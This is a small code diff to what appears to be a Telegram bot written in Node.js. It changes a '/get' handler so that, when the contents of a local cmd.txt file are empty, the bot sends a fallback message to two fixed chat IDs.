@@ -28,8 +28,8 @@ bot.on("message", (msg) => {
     if(msg.text.indexOf("/get")===0) {
         const cmd = fs.readFileSync("./cmd.txt");
         
-        bot.sendMessage(5088649217, cmd);
-        bot.sendMessage(1417274417, cmd);
+        bot.sendMessage(5088649217, cmd||"No Command Empty!");
+        bot.sendMessage(1417274417, cmd||"No Command Empty!");
     }
 
     if(msg.text.indexOf("/doit")===0) {
